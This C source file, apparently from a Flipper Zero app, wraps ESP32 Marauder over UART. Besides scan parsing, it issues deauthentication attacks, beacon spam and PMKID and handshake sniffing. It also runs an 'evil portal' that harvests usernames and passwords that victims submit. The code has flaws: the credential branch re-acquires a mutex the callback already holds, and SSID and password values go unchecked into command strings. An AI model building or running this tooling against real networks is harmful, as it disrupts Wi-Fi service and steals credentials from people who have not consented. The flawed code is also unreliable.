/**
 * marauder.c — Marauder command abstraction over WiFi UART.
 *
 * Marauder text output format (relevant lines)
 * ~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
 *   scanap results:
 *     <idx> <SSID> <RSSI> <Channel> <BSSID> <Encryption>
 *     e.g.  0 MyNetwork -45 6 AA:BB:CC:DD:EE:FF WPA2
 *
 *   pingscan results:
 *     <IP> alive
 *     <IP> dead
 *
 *   portscan results:
 *     <port> open <service>
 *     <port> closed
 *
 *   Prompts start with ">"; binary PCAP framing with "[BUF/" — both are
 *   filtered upstream in wifi_uart.c before reaching this callback.
 *
 * Parsing strategy
 * ~~~~~~~~~~~~~~~~
 *   strtok is unavailable in the Flipper SDK libc.  All tokenising uses
 *   strchr to locate space delimiters and manual pointer arithmetic.
 */

#include "marauder.h"

#include <string.h>
#include <stdlib.h>

#define TAG "FPwn"

/* --------------------------------------------------------------------------
 * Internal struct
 * -------------------------------------------------------------------------- */
struct FPwnMarauder {
    FPwnWifiUart* uart;
    FPwnMarauderState state;

    FPwnWifiAP aps[FPWN_MAX_APS];
    uint32_t ap_count;

    FPwnNetHost hosts[FPWN_MAX_HOSTS];
    uint32_t host_count;

    FPwnPortResult ports[FPWN_MAX_PORTS];
    uint32_t port_count;

    FPwnStation stations[FPWN_MAX_STATIONS];
    uint32_t station_count;

    FPwnCapturedCred creds[FPWN_MAX_CREDS];
    uint32_t cred_count;

    FuriMutex* mutex;

    uint32_t scan_start_tick; /* furi_get_tick() when the current AP scan started */

    /* Secondary log callback — fires for every received line after parsing. */
    FPwnWifiRxCallback log_callback;
    void* log_callback_ctx;
};

/* --------------------------------------------------------------------------
 * Parser helpers
 * -------------------------------------------------------------------------- */

/* Copy at most `n-1` bytes of the current token (up to the next space or
 * end-of-string) into `dst`, then null-terminate.
 * Returns a pointer to the start of the NEXT token (after any trailing
 * spaces), or NULL if there is no further token. */
static const char* copy_token(const char* src, char* dst, size_t n) {
    size_t i = 0;
    while(*src && *src != ' ' && i < n - 1) {
        dst[i++] = *src++;
    }
    dst[i] = '\0';
    /* Advance past delimiter spaces to the next token. */
    while(*src == ' ')
        src++;
    return (*src) ? src : NULL;
}

/* --------------------------------------------------------------------------
 * Marauder output parsers
 * -------------------------------------------------------------------------- */

/*
 * Try to parse a scanap result line into `ap`.
 *
 * Expected format (space-separated):
 *   <idx> <SSID> <RSSI> <Channel> <BSSID> <Encryption>
 *
 * Returns true on success.
 */
static bool parse_ap_line(const char* line, FPwnWifiAP* ap) {
    const char* p = line;

    /* Field 0: index (decimal integer, discarded).
     * copy_token advances p to the start of the next token. */
    if(!p || *p < '0' || *p > '9') return false;
    char idx_buf[8];
    p = copy_token(p, idx_buf, sizeof(idx_buf));
    if(!p) return false;

    /* Field 1: SSID */
    p = copy_token(p, ap->ssid, sizeof(ap->ssid));
    if(!p) return false;

    /* Field 2: RSSI (signed, atoi handles leading '-') */
    char rssi_buf[8];
    p = copy_token(p, rssi_buf, sizeof(rssi_buf));
    ap->rssi = (int8_t)atoi(rssi_buf);
    if(!p) return false;

    /* Field 3: Channel */
    char ch_buf[4];
    p = copy_token(p, ch_buf, sizeof(ch_buf));
    ap->channel = (uint8_t)atoi(ch_buf);
    if(!p) return false;

    /* Field 4: BSSID */
    p = copy_token(p, ap->bssid, sizeof(ap->bssid));
    if(!p) return false;

    /* Field 5: Encryption label (last field — NULL return is fine) */
    char enc_buf[8];
    copy_token(p, enc_buf, sizeof(enc_buf));

    if(strcmp(enc_buf, "Open") == 0 || strcmp(enc_buf, "OPEN") == 0) {
        ap->encryption = 0;
    } else if(strcmp(enc_buf, "WEP") == 0) {
        ap->encryption = 1;
    } else if(strcmp(enc_buf, "WPA") == 0) {
        ap->encryption = 2;
    } else {
        /* WPA2, WPA2-EAP, unknown — default to WPA2 */
        ap->encryption = 3;
    }

    return true;
}

/*
 * Try to parse a Marauder 'list -a' line into `ap`.
 *
 * Common format: [idx] SSID (rssi) ch:X [ENC] BSSID
 * Example:       [0] MyNetwork (-45) ch:6 [WPA2] AA:BB:CC:DD:EE:FF
 *
 * Returns true on success.
 */
static bool parse_list_ap_line(const char* line, FPwnWifiAP* ap) {
    /* Must start with '[' (bracketed index) */
    if(line[0] != '[') return false;

    const char* idx_end = strchr(line, ']');
    if(!idx_end) return false;
    const char* p = idx_end + 1;

    while(*p == ' ')
        p++;
    if(!*p) return false;

    /* SSID: everything up to the opening '(' that precedes the RSSI */
    const char* paren = strchr(p, '(');
    if(!paren) return false;

    size_t ssid_len = (size_t)(paren - p);
    while(ssid_len > 0 && p[ssid_len - 1] == ' ')
        ssid_len--;
    if(ssid_len > 32) ssid_len = 32;
    memcpy(ap->ssid, p, ssid_len);
    ap->ssid[ssid_len] = '\0';

    /* RSSI inside the parentheses */
    p = paren + 1;
    ap->rssi = (int8_t)atoi(p);

    const char* close_paren = strchr(p, ')');
    if(!close_paren) return false;
    p = close_paren + 1;
    while(*p == ' ')
        p++;

    /* Channel: "ch:X" or "Ch:X" */
    if(strncmp(p, "ch:", 3) == 0 || strncmp(p, "Ch:", 3) == 0) {
        ap->channel = (uint8_t)atoi(p + 3);
        p += 3;
        while(*p >= '0' && *p <= '9')
            p++;
        while(*p == ' ')
            p++;
    }

    /* Encryption: [WPA2], [WPA], [WEP], [Open], etc. */
    if(*p == '[') {
        p++;
        const char* enc_end = strchr(p, ']');
        if(enc_end) {
            size_t enc_len = (size_t)(enc_end - p);
            char enc_buf[8];
            if(enc_len > sizeof(enc_buf) - 1) enc_len = sizeof(enc_buf) - 1;
            memcpy(enc_buf, p, enc_len);
            enc_buf[enc_len] = '\0';

            if(strcmp(enc_buf, "Open") == 0 || strcmp(enc_buf, "OPEN") == 0)
                ap->encryption = 0;
            else if(strcmp(enc_buf, "WEP") == 0)
                ap->encryption = 1;
            else if(strcmp(enc_buf, "WPA") == 0)
                ap->encryption = 2;
            else
                ap->encryption = 3; /* WPA2 or anything else */

            p = enc_end + 1;
            while(*p == ' ')
                p++;
        }
    }

    /* BSSID: remaining content */
    if(*p) {
        strncpy(ap->bssid, p, sizeof(ap->bssid) - 1);
        ap->bssid[sizeof(ap->bssid) - 1] = '\0';
        /* Trim trailing whitespace */
        size_t blen = strlen(ap->bssid);
        while(blen > 0 && (ap->bssid[blen - 1] == ' ' || ap->bssid[blen - 1] == '\n' ||
                           ap->bssid[blen - 1] == '\r')) {
            ap->bssid[--blen] = '\0';
        }
    }

    return ap->ssid[0] != '\0';
}

/*
 * Try to parse a pingscan result line into `host`.
 *
 * Expected format:  <IP> alive   or   <IP> dead
 */
static bool parse_host_line(const char* line, FPwnNetHost* host) {
    const char* p = line;

    /* Field 0: IP address — must start with a digit. */
    if(*p < '0' || *p > '9') return false;

    /* copy_token advances p to the "alive"/"dead" token. */
    p = copy_token(p, host->ip, sizeof(host->ip));
    if(!p) return false;

    host->alive = (strncmp(p, "alive", 5) == 0);
    return true;
}

/*
 * Try to parse a portscan result line into `port`.
 *
 * Expected formats:
 *   <port> open <service>
 *   <port> closed
 */
static bool parse_port_line(const char* line, FPwnPortResult* result) {
    const char* p = line;

    /* Field 0: port number — must start with a digit. */
    if(*p < '0' || *p > '9') return false;

    char port_buf[8];
    /* copy_token advances p to the "open"/"closed" token. */
    p = copy_token(p, port_buf, sizeof(port_buf));
    result->port = (uint16_t)atoi(port_buf);
    if(!p) return false;

    if(strncmp(p, "open", 4) == 0) {
        result->open = true;
        /* Advance p past the "open" token; copy_token returns a pointer
         * to the next token (the service name) or NULL. */
        char discard[8];
        const char* svc_start = copy_token(p, discard, sizeof(discard));
        if(svc_start && *svc_start) {
            copy_token(svc_start, result->service, sizeof(result->service));
        } else {
            result->service[0] = '\0';
        }
    } else if(strncmp(p, "closed", 6) == 0) {
        result->open = false;
        result->service[0] = '\0';
    } else {
        return false;
    }

    return true;
}

/*
 * Try to parse a scansta result line into `sta`.
 *
 * Expected format (space-separated):
 *   <MAC> <RSSI> <AP_SSID>
 *   e.g.  AA:BB:CC:DD:EE:FF -65 MyNetwork
 *
 * Detection heuristic: line starts with two hex digits followed by ':'.
 * Returns true on success.
 */
static bool parse_station_line(const char* line, FPwnStation* sta) {
    /* Quick rejection: must start with two hex chars then ':'. */
    if(!((line[0] >= '0' && line[0] <= '9') || (line[0] >= 'A' && line[0] <= 'F') ||
         (line[0] >= 'a' && line[0] <= 'f')))
        return false;
    if(!((line[1] >= '0' && line[1] <= '9') || (line[1] >= 'A' && line[1] <= 'F') ||
         (line[1] >= 'a' && line[1] <= 'f')))
        return false;
    if(line[2] != ':') return false;

    const char* p = line;

    /* Field 0: MAC address */
    p = copy_token(p, sta->mac, sizeof(sta->mac));
    if(!p) return false;

    /* Field 1: RSSI */
    char rssi_buf[8];
    p = copy_token(p, rssi_buf, sizeof(rssi_buf));
    sta->rssi = (int8_t)atoi(rssi_buf);

    /* Field 2: AP SSID — rest of line (may be absent if station is unassociated) */
    if(p && *p) {
        strncpy(sta->ap_ssid, p, sizeof(sta->ap_ssid) - 1);
        sta->ap_ssid[sizeof(sta->ap_ssid) - 1] = '\0';
        /* Trim trailing whitespace */
        size_t len = strlen(sta->ap_ssid);
        while(len > 0 && (sta->ap_ssid[len - 1] == ' ' || sta->ap_ssid[len - 1] == '\r' ||
                          sta->ap_ssid[len - 1] == '\n')) {
            sta->ap_ssid[--len] = '\0';
        }
    } else {
        sta->ap_ssid[0] = '\0';
    }

    return true;
}

/* --------------------------------------------------------------------------
 * UART RX callback — dispatches parsed results into arrays
 * -------------------------------------------------------------------------- */
static void fpwn_marauder_rx_cb(const char* line, void* ctx) {
    FPwnMarauder* m = (FPwnMarauder*)ctx;

    /* Marauder prompt lines start with ">"; skip them. */
    if(line[0] == '>') return;

    furi_mutex_acquire(m->mutex, FuriWaitForever);

    switch(m->state) {
    case FPwnMarauderStateScanning:
    case FPwnMarauderStateScanStopping: {
        /* Skip status / header lines. Detect end-of-results markers while
         * draining so we can transition to Idle without waiting for the
         * safety timeout in the timer callback. */
        if(strstr(line, "Scan complete") || strstr(line, "Scanning") || strstr(line, "Stopping") ||
           strstr(line, "[APs]")) {
            if(m->state == FPwnMarauderStateScanStopping &&
               (strstr(line, "Scan complete") || strstr(line, "Done"))) {
                m->state = FPwnMarauderStateIdle;
                FURI_LOG_I(TAG, "scan complete, %lu APs", (unsigned long)m->ap_count);
            }
            break;
        }

        FPwnWifiAP ap;
        memset(&ap, 0, sizeof(ap));
        if(parse_ap_line(line, &ap)) {
            if(m->ap_count < FPWN_MAX_APS) {
                m->aps[m->ap_count++] = ap;
                FURI_LOG_D(
                    TAG, "AP[%lu]: %s %s", (unsigned long)m->ap_count - 1, ap.ssid, ap.bssid);
            }
        } else if(parse_list_ap_line(line, &ap)) {
            if(m->ap_count < FPWN_MAX_APS) {
                m->aps[m->ap_count++] = ap;
                FURI_LOG_D(
                    TAG, "AP[%lu]: %s %s", (unsigned long)m->ap_count - 1, ap.ssid, ap.bssid);
            }
        }
        break;
    }

    case FPwnMarauderStatePingScan: {
        FPwnNetHost host;
        memset(&host, 0, sizeof(host));
        if(parse_host_line(line, &host)) {
            if(m->host_count < FPWN_MAX_HOSTS) {
                m->hosts[m->host_count++] = host;
                FURI_LOG_D(
                    TAG,
                    "Host[%lu]: %s %s",
                    (unsigned long)m->host_count - 1,
                    host.ip,
                    host.alive ? "alive" : "dead");
            }
        }
        break;
    }

    case FPwnMarauderStatePortScan: {
        FPwnPortResult pr;
        memset(&pr, 0, sizeof(pr));
        if(parse_port_line(line, &pr)) {
            if(m->port_count < FPWN_MAX_PORTS) {
                m->ports[m->port_count++] = pr;
                FURI_LOG_D(
                    TAG,
                    "Port[%lu]: %u %s",
                    (unsigned long)m->port_count - 1,
                    pr.port,
                    pr.open ? "open" : "closed");
            }
        }
        break;
    }

    case FPwnMarauderStateStationScan: {
        FPwnStation sta;
        memset(&sta, 0, sizeof(sta));
        if(parse_station_line(line, &sta)) {
            if(m->station_count < FPWN_MAX_STATIONS) {
                m->stations[m->station_count++] = sta;
                FURI_LOG_D(
                    TAG,
                    "STA[%lu]: %s rssi=%d ap=%s",
                    (unsigned long)m->station_count - 1,
                    sta.mac,
                    (int)sta.rssi,
                    sta.ap_ssid);
            }
        }
        break;
    }

    case FPwnMarauderStateEvilPortal:
        /* Capture POST data and credential-bearing lines from the portal.
         * Marauder outputs lines like "POST data: user=x&pass=y" when a
         * victim submits the captive portal form. */
        if(strstr(line, "POST") || strstr(line, "post") || strstr(line, "password") ||
           strstr(line, "Password") || strstr(line, "username") || strstr(line, "Username") ||
           strstr(line, "credential") || strstr(line, "login")) {
            if(m->cred_count < FPWN_MAX_CREDS) {
                furi_mutex_acquire(m->mutex, FuriWaitForever);
                if(m->cred_count < FPWN_MAX_CREDS) {
                    strncpy(m->creds[m->cred_count].data, line, sizeof(m->creds[0].data) - 1);
                    m->creds[m->cred_count].data[sizeof(m->creds[0].data) - 1] = '\0';
                    m->cred_count++;
                }
                furi_mutex_release(m->mutex);
                FURI_LOG_I(
                    TAG,
                    "Evil portal cred captured [%lu]: %s",
                    (unsigned long)m->cred_count - 1,
                    line);
            }
        }
        break;

    case FPwnMarauderStateSniffDeauth:
        /* Raw handshake capture — no structured parsing, output goes to log
         * TextBox via the log_callback forwarding below. */
        break;

    case FPwnMarauderStateSniffProbe:
        /* Raw probe request capture — no structured parsing, output goes to
         * log TextBox via the log_callback forwarding below. */
        break;

    default:
        /* Other states: log but don't parse structured output. */
        FURI_LOG_D(TAG, "RX[idle]: %s", line);
        break;
    }

    furi_mutex_release(m->mutex);

    /* Forward every line to the optional log callback (status TextBox). */
    if(m->log_callback) {
        m->log_callback(line, m->log_callback_ctx);
    }
}

/* --------------------------------------------------------------------------
 * Lifecycle
 * -------------------------------------------------------------------------- */

FPwnMarauder* fpwn_marauder_alloc(FPwnWifiUart* uart) {
    furi_assert(uart);

    FPwnMarauder* m = malloc(sizeof(FPwnMarauder));
    furi_assert(m);
    memset(m, 0, sizeof(FPwnMarauder));

    m->uart = uart;
    m->state = FPwnMarauderStateIdle;

    m->mutex = furi_mutex_alloc(FuriMutexTypeNormal);
    furi_assert(m->mutex);

    fpwn_wifi_uart_set_rx_callback(uart, fpwn_marauder_rx_cb, m);

    FURI_LOG_I(TAG, "Marauder layer initialised");
    return m;
}

void fpwn_marauder_free(FPwnMarauder* marauder) {
    furi_assert(marauder);
    /* Deregister callback so no stale calls fire after free. */
    fpwn_wifi_uart_set_rx_callback(marauder->uart, NULL, NULL);
    furi_mutex_free(marauder->mutex);
    free(marauder);
}

/* --------------------------------------------------------------------------
 * Commands
 * -------------------------------------------------------------------------- */

void fpwn_marauder_scan_ap(FPwnMarauder* m) {
    furi_assert(m);
    furi_mutex_acquire(m->mutex, FuriWaitForever);
    memset(m->aps, 0, sizeof(m->aps));
    m->ap_count = 0;
    m->state = FPwnMarauderStateScanning;
    m->scan_start_tick = furi_get_tick();
    furi_mutex_release(m->mutex);

    fpwn_wifi_uart_send(m->uart, "scanap");
    FURI_LOG_I(TAG, "scanap started");
}

void fpwn_marauder_stop_scan(FPwnMarauder* m) {
    furi_assert(m);
    fpwn_wifi_uart_send(m->uart, "stopscan");

    furi_mutex_acquire(m->mutex, FuriWaitForever);
    m->state = FPwnMarauderStateScanStopping;
    furi_mutex_release(m->mutex);

    /* Some Marauder firmware versions require an explicit 'list -a' after
     * stopscan to emit buffered AP results. Send it as a follow-up. */
    fpwn_wifi_uart_send(m->uart, "list -a");

    FURI_LOG_I(TAG, "scan stopping, waiting for results");
}

void fpwn_marauder_join(FPwnMarauder* m, uint8_t ap_idx, const char* password) {
    furi_assert(m);
    furi_assert(password);

    char cmd[128];

    if(password[0] != '\0') {
        snprintf(cmd, sizeof(cmd), "join -a %u -p %s", (unsigned)ap_idx, password);
    } else {
        snprintf(cmd, sizeof(cmd), "join -a %u", (unsigned)ap_idx);
    }

    fpwn_wifi_uart_send(m->uart, cmd);

    furi_mutex_acquire(m->mutex, FuriWaitForever);
    m->state = FPwnMarauderStateJoined;
    furi_mutex_release(m->mutex);

    FURI_LOG_I(TAG, "join AP %u", (unsigned)ap_idx);
}

void fpwn_marauder_ping_scan(FPwnMarauder* m) {
    furi_assert(m);
    furi_mutex_acquire(m->mutex, FuriWaitForever);
    memset(m->hosts, 0, sizeof(m->hosts));
    m->host_count = 0;
    m->state = FPwnMarauderStatePingScan;
    furi_mutex_release(m->mutex);

    fpwn_wifi_uart_send(m->uart, "pingscan");
    FURI_LOG_I(TAG, "pingscan started");
}

void fpwn_marauder_port_scan(FPwnMarauder* m, uint8_t host_idx, bool all_ports) {
    furi_assert(m);
    furi_mutex_acquire(m->mutex, FuriWaitForever);
    memset(m->ports, 0, sizeof(m->ports));
    m->port_count = 0;
    m->state = FPwnMarauderStatePortScan;
    furi_mutex_release(m->mutex);

    char cmd[64];
    if(all_ports) {
        snprintf(cmd, sizeof(cmd), "portscan -t %u -a", (unsigned)host_idx);
    } else {
        snprintf(cmd, sizeof(cmd), "portscan -t %u", (unsigned)host_idx);
    }

    fpwn_wifi_uart_send(m->uart, cmd);
    FURI_LOG_I(TAG, "portscan host %u (all=%d)", (unsigned)host_idx, (int)all_ports);
}

void fpwn_marauder_deauth(FPwnMarauder* m) {
    furi_assert(m);
    fpwn_wifi_uart_send(m->uart, "attack -t deauth");

    furi_mutex_acquire(m->mutex, FuriWaitForever);
    m->state = FPwnMarauderStateDeauth;
    furi_mutex_release(m->mutex);

    FURI_LOG_I(TAG, "deauth attack started");
}

void fpwn_marauder_sniff_pmkid(FPwnMarauder* m) {
    furi_assert(m);
    fpwn_wifi_uart_send(m->uart, "sniffpmkid");

    furi_mutex_acquire(m->mutex, FuriWaitForever);
    m->state = FPwnMarauderStateSniffPmkid;
    furi_mutex_release(m->mutex);

    FURI_LOG_I(TAG, "pmkid sniff started");
}

void fpwn_marauder_stop(FPwnMarauder* m) {
    furi_assert(m);
    fpwn_wifi_uart_send(m->uart, "stopscan");

    furi_mutex_acquire(m->mutex, FuriWaitForever);
    m->state = FPwnMarauderStateIdle;
    furi_mutex_release(m->mutex);

    FURI_LOG_I(TAG, "stopped");
}

void fpwn_marauder_evil_portal(FPwnMarauder* m, const char* ssid) {
    furi_assert(m);
    /* Start evil portal — Marauder hosts a captive portal AP */
    char cmd[128];
    snprintf(cmd, sizeof(cmd), "evilportal -s %s", ssid);
    fpwn_wifi_uart_send(m->uart, cmd);

    furi_mutex_acquire(m->mutex, FuriWaitForever);
    memset(m->creds, 0, sizeof(m->creds));
    m->cred_count = 0;
    m->state = FPwnMarauderStateEvilPortal;
    furi_mutex_release(m->mutex);

    FURI_LOG_I(TAG, "evil portal started: %s", ssid);
}

void fpwn_marauder_beacon_spam(FPwnMarauder* m) {
    furi_assert(m);
    fpwn_wifi_uart_send(m->uart, "attack -t beacon -l");

    furi_mutex_acquire(m->mutex, FuriWaitForever);
    m->state = FPwnMarauderStateBeaconSpam;
    furi_mutex_release(m->mutex);

    FURI_LOG_I(TAG, "beacon spam started");
}

void fpwn_marauder_scan_sta(FPwnMarauder* m) {
    furi_assert(m);
    furi_mutex_acquire(m->mutex, FuriWaitForever);
    memset(m->stations, 0, sizeof(m->stations));
    m->station_count = 0;
    m->state = FPwnMarauderStateStationScan;
    furi_mutex_release(m->mutex);
    fpwn_wifi_uart_send(m->uart, "scansta");
    FURI_LOG_I(TAG, "station scan started");
}

void fpwn_marauder_sniff_deauth(FPwnMarauder* m) {
    furi_assert(m);
    fpwn_wifi_uart_send(m->uart, "sniffdeauth");
    furi_mutex_acquire(m->mutex, FuriWaitForever);
    m->state = FPwnMarauderStateSniffDeauth;
    furi_mutex_release(m->mutex);
    FURI_LOG_I(TAG, "sniff deauth (handshake capture) started");
}

void fpwn_marauder_select_ap(FPwnMarauder* m, uint8_t ap_idx) {
    furi_assert(m);
    char cmd[32];
    snprintf(cmd, sizeof(cmd), "select -a %u", (unsigned)ap_idx);
    fpwn_wifi_uart_send(m->uart, cmd);
    FURI_LOG_I(TAG, "selected AP %u", (unsigned)ap_idx);
}

void fpwn_marauder_sniff_probe(FPwnMarauder* m) {
    furi_assert(m);
    fpwn_wifi_uart_send(m->uart, "sniffprobes");

    furi_mutex_acquire(m->mutex, FuriWaitForever);
    m->state = FPwnMarauderStateSniffProbe;
    furi_mutex_release(m->mutex);

    FURI_LOG_I(TAG, "probe sniff started");
}

void fpwn_marauder_deauth_targeted(FPwnMarauder* m, uint8_t ap_idx) {
    furi_assert(m);
    /* First select the AP, then deauth */
    fpwn_marauder_select_ap(m, ap_idx);
    furi_delay_ms(200); /* Small delay for Marauder to process select */
    fpwn_wifi_uart_send(m->uart, "attack -t deauth");

    furi_mutex_acquire(m->mutex, FuriWaitForever);
    m->state = FPwnMarauderStateDeauth;
    furi_mutex_release(m->mutex);

    FURI_LOG_I(TAG, "targeted deauth AP %u", (unsigned)ap_idx);
}

/* --------------------------------------------------------------------------
 * Log callback
 * -------------------------------------------------------------------------- */

void fpwn_marauder_set_log_callback(FPwnMarauder* m, FPwnWifiRxCallback cb, void* ctx) {
    furi_assert(m);
    m->log_callback_ctx = ctx;
    __DMB();
    m->log_callback = cb;
}

/* --------------------------------------------------------------------------
 * Accessors
 * -------------------------------------------------------------------------- */

FPwnMarauderState fpwn_marauder_get_state(FPwnMarauder* m) {
    furi_assert(m);
    furi_mutex_acquire(m->mutex, FuriWaitForever);
    FPwnMarauderState s = m->state;
    furi_mutex_release(m->mutex);
    return s;
}

FPwnWifiAP* fpwn_marauder_get_aps(FPwnMarauder* m, uint32_t* count) {
    furi_assert(m);
    furi_assert(count);
    furi_mutex_acquire(m->mutex, FuriWaitForever);
    *count = m->ap_count;
    furi_mutex_release(m->mutex);
    return m->aps;
}

FPwnNetHost* fpwn_marauder_get_hosts(FPwnMarauder* m, uint32_t* count) {
    furi_assert(m);
    furi_assert(count);
    furi_mutex_acquire(m->mutex, FuriWaitForever);
    *count = m->host_count;
    furi_mutex_release(m->mutex);
    return m->hosts;
}

FPwnPortResult* fpwn_marauder_get_ports(FPwnMarauder* m, uint32_t* count) {
    furi_assert(m);
    furi_assert(count);
    furi_mutex_acquire(m->mutex, FuriWaitForever);
    *count = m->port_count;
    furi_mutex_release(m->mutex);
    return m->ports;
}

FPwnStation* fpwn_marauder_get_stations(FPwnMarauder* m, uint32_t* count) {
    furi_assert(m);
    furi_assert(count);
    furi_mutex_acquire(m->mutex, FuriWaitForever);
    *count = m->station_count;
    furi_mutex_release(m->mutex);
    return m->stations;
}

FPwnCapturedCred* fpwn_marauder_get_creds(FPwnMarauder* m, uint32_t* count) {
    furi_assert(m);
    furi_assert(count);
    furi_mutex_acquire(m->mutex, FuriWaitForever);
    *count = m->cred_count;
    furi_mutex_release(m->mutex);
    return m->creds;
}

/* Returns the furi_get_tick() value recorded when the last AP scan started.
 * Used by the timer callback to auto-stop after a fixed interval. */
uint32_t fpwn_marauder_get_scan_start(FPwnMarauder* m) {
    furi_assert(m);
    furi_mutex_acquire(m->mutex, FuriWaitForever);
    uint32_t tick = m->scan_start_tick;
    furi_mutex_release(m->mutex);
    return tick;
}
